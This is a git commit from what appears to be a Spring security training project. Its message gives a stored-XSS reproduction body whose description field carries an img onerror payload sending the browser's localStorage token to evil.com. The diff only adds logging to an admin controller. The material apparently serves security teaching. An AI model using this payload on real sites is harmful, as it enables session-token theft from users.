47e7c779241d327563e4f4c14dfff55794458919
Victor Rentea <victorrentea@gmail.com>
2023-03-21 15:32:40 +0200

    proudly committing: XSS to reproduce send this body to PUT traiing {     "name": "Spring Framework",     "language": "JAVA",     "startDate": "31-03-2023",     "teacherId": "1",     "version": 1,     "description": "<h1>A<em>ll about <img src='bull' onerror='fetch(\"http://evil.com/stole-cookie?token=\" + localStorage.getItem(\"token\"))'></img>" }

--- spring-app/src/main/java/victor/training/spring/security/AdminController.java
+++ spring-app/src/main/java/victor/training/spring/security/AdminController.java
@@ -1,10 +1,12 @@
 package victor.training.spring.security;
 
+import lombok.extern.slf4j.Slf4j;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.security.access.annotation.Secured;
 import org.springframework.web.bind.annotation.GetMapping;
 import org.springframework.web.bind.annotation.RestController;
 
+@Slf4j
 @RestController
 @Secured("ROLE_ADMIN")
 // you can create an aspect that checks that you went throught the authorization
@@ -13,6 +15,8 @@ public class AdminController {
   // TODO URL-pattern restriction: admin/**
   @GetMapping("admin/launch")
   public String restart() {
+    log.info("[TAG-12516] App was restarted"); // DO NOT REMOVE THAT TOKEN!! because kibana scraps the logs
+    // for this token and raises alerts,
     return "What does this red button do?     ... [Missile Launched]";
   }
 
